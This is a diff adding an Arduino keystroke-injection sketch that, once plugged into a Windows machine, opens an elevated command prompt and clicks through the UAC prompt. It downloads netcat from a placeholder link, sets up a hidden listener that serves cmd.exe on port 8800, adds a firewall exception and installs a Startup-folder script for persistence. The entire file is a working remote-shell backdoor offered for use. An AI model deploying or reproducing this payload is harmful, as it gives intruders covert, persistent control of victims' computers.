@@ -1,0 +1,136 @@
+
+#include <Keyboard.h>
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  Keyboard.begin();
+
+  delay(500);
+
+  delay(200);
+  // —> Minimize all windows
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(500);
+  Keyboard.print(F("powershell Start-Process cmd -Verb RunAs"));
+
+  typeKey(KEY_RETURN);
+
+  delay(1500);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+
+  delay(500);
+  Keyboard.print(F("cd TEMP"));
+
+  typeKey(KEY_RETURN);
+
+  // —> Kills already running Netcat instance (if any)
+  Keyboard.print(F("TASKKILL /im nc.exe /f"));
+
+  typeKey(KEY_RETURN);
+
+  // —> Delete nc.exe file if it already exists
+  Keyboard.print(F("erase /Q nc.exe"));
+
+  typeKey(KEY_RETURN);
+
+  // —> Delete Start batch file if it already exists
+  Keyboard.print(F("erase /Q Start.bat"));
+
+  typeKey(KEY_RETURN);
+
+  // —> Delete Invisible.vbs in temp folder, if it already exists
+  Keyboard.print(F("erase /Q invisible.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  // —> Delete invisible.vbs file in Startup if it already exists
+  Keyboard.print(F("erase /Q “C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\invisible.vbs”"));
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  // —> Downloads NetCat
+  Keyboard.print(F("powershell (new-object System.Net.WebClient).DownloadFile(‘http://[NETCAT_DOWNLOAD_LINK]/nc.exe’,‘nc.exe’)"));
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  // —> Creates a batch file to start listening
+  Keyboard.print(F("copy con Start.bat"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("nc -lp 8800 -vv -e cmd.exe -L"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  // —> Starts batch file invisibly
+  Keyboard.print(F("copy con invisible.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("Set WshShell = CreateObject(“WScript.Shell” )"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("WshShell.Run chr(34) & “TEMP\\Start.bat” & Chr(34), 0"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("Set WshShell = Nothing"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('z');
+  Keyboard.releaseAll();
+
+  typeKey(KEY_RETURN);
+
+  // —> Add netcat to allowed programs list, enabling it to communicate through the firewall seamlessly
+  Keyboard.print(F("netsh advfirewall firewall add rule name=“Netcat” dir=in action=allow program=“TEMP\\nc.exe” enable=yes"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("start invisible.vbs"));
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  // —> Copies invisible.vbs to startup folder for persistence
+  Keyboard.print(F("copy “invisible.vbs” “C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp”"));
+
+  typeKey(KEY_RETURN);
+
+  // —> Kills CMD while nc.exe continues running in background, remove Ducky after CMD closes
+  Keyboard.print(F("exit"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.end();
+}
+
+void loop() {}
